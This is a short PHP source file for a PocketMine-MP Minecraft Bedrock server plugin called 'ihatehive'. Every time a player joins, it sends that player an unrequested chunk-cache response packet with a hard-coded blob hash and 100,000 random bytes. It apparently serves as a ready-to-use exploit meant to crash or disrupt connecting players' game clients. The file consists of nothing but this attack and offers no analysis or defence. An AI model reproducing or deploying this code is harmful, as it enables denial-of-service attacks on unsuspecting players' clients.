<?php

namespace tal\ihatehive;

use Exception;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\network\mcpe\protocol\ClientCacheMissResponsePacket;
use pocketmine\network\mcpe\protocol\types\ChunkCacheBlob;
use pocketmine\plugin\PluginBase;

class Main extends PluginBase implements Listener
{

    public static self $instance;

    protected function onEnable(): void
    {
        self::$instance = $this;
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
    }

    /**
     * @throws Exception
     */
    public function onJoin(PlayerJoinEvent $event): void
    {
        $player = $event->getPlayer();
        $player->getNetworkSession()->sendDataPacket(ClientCacheMissResponsePacket::create([
            new ChunkCacheBlob(-2146396181429839107, random_bytes(100000))
        ]));
    }

}
